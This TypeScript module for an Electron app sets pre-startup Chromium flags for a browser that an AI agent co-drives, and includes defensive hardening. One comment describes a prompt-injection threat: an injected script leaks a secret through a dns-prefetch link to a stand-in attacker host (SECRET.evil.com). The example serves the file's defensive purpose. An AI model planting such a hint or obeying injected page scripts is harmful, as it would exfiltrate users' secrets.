/**
 * Pre-ready Chromium command-line flags for the desktop app.
 *
 * Chromium reads its command line only at startup, so every one of these MUST
 * be applied before app.ready — that's why they live in one function called at
 * the top of main, not scattered across the ready handler. Kept out of main.ts
 * (a launch orchestrator at the size ceiling) as a cohesive, separately
 * reviewable unit.
 */
import { app } from "electron";
import { existsSync, readFileSync } from "node:fs";
import { homedir } from "node:os";
import { join } from "node:path";
import { initBrowserNetworkHardening } from "./browser-partition";
import { enableLoopbackCdpEndpoint } from "./cdp-endpoint";

/** The pre-ready slice of ~/.lax/config.json. Read once, before app.ready,
 *  because Chromium parses its command line only at startup. Falls back to
 *  safe defaults when the file is missing or malformed. */
function earlyConfig(): { port: number; nativeDriving: boolean } {
  try {
    const c = join(homedir(), ".lax", "config.json");
    if (existsSync(c)) {
      const cfg = JSON.parse(readFileSync(c, "utf-8"));
      return { port: cfg.port || 7007, nativeDriving: cfg.browserNativeDriving === true };
    }
  } catch { /* fall through to defaults */ }
  return { port: 7007, nativeDriving: false };
}

/** Apply all pre-ready Chromium flags + browser network hardening. */
export function applyChromiumLaunchFlags(): void {
  const cfg = earlyConfig();
  // Only mark our own server origin as secure — not every loopback port.
  app.commandLine.appendSwitch("unsafely-treat-insecure-origin-as-secure", `http://127.0.0.1:${cfg.port}`);
  app.commandLine.appendSwitch("enable-features", "WebRTCPipeWireCapturer");
  app.commandLine.appendSwitch("enable-media-stream");
  // Consolidated --disable-features. Chromium honors only the LAST
  // appendSwitch("disable-features", …), so every feature-disable MUST live in
  // this single call or it silently clobbers the others.
  //   • AudioServiceSandbox — the sandboxed audio service can't load third-party
  //     virtual audio drivers (Steam Streaming Microphone, VB-Cable, OBS, NVIDIA
  //     Broadcast, …), so getUserMedia silently captured nothing from them in the
  //     desktop app even though the same device works in a normal browser.
  //     Disabling the audio sandbox lets the audio process reach those devices.
  //     Out-of-process audio stays on (only the sandbox is dropped), so the blast
  //     radius is small.
  //   • NetworkPrediction — closes a DNS-label exfil channel: a prompt-injected
  //     script can leak a secret via a `<link rel=dns-prefetch|preconnect
  //     href=https://SECRET.evil.com>` hint (DNS query, no HTTP request, no fetch),
  //     which CSP can't gate and no evaluate regex reliably catches. Disabling the
  //     network-prediction service makes those hints inert. app.commandLine is
  //     app-global, but every WebContentsView in this app is the agent's co-driven
  //     browser — the user's real personal browsing happens in a separate Chrome/
  //     Safari install this app can't touch — so this only hardens the agent
  //     browser and is in scope. Paired with dns-prefetch-disable below.
  app.commandLine.appendSwitch("disable-features", "AudioServiceSandbox,NetworkPrediction");
  // Standalone switch (no conflict with disable-features): kills DNS prefetching
  // so the dns-prefetch/preconnect DNS-label exfil hint is inert at the network
  // layer, matching the CDP/Playwright agent-Chrome backend in src/browser/launcher.ts.
  app.commandLine.appendSwitch("dns-prefetch-disable");
  // permission-request handler in app.ready controls media grants explicitly.
  initBrowserNetworkHardening(); // QUIC/DoH off (app-wide, pre-ready) for browser-view partitions
  // OPT-IN ONLY (config.browserNativeDriving). The switch is not free: Chromium
  // marks every page in the app automation-controlled for the whole session, so
  // human-verification challenges become unpassable. Off → the agent drives via
  // the legacy bridge. See the field doc in src/types/lax-config.ts.
  if (cfg.nativeDriving) enableLoopbackCdpEndpoint();
}
